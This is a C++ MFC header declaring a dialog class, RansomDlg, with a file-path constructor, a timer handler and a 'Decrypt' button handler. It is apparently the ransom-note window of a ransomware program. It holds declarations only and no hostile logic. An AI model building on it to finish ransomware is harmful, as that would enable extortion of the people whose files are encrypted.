#pragma once


// RansomDlg dialog

class RansomDlg : public CDialog
{
	DECLARE_DYNAMIC(RansomDlg)

public:
	RansomDlg(CWnd* pParent = NULL);   // standard constructor
	RansomDlg(WCHAR* filePath);

	virtual ~RansomDlg();

// Dialog Data
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_RANSOMDLG };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support

	DECLARE_MESSAGE_MAP()
public:
	virtual BOOL OnInitDialog();
	afx_msg void OnTimer(UINT_PTR nIDEvent);
	afx_msg void OnBnClickedButtonDecrypt();
	WCHAR m_filePath[512];
};
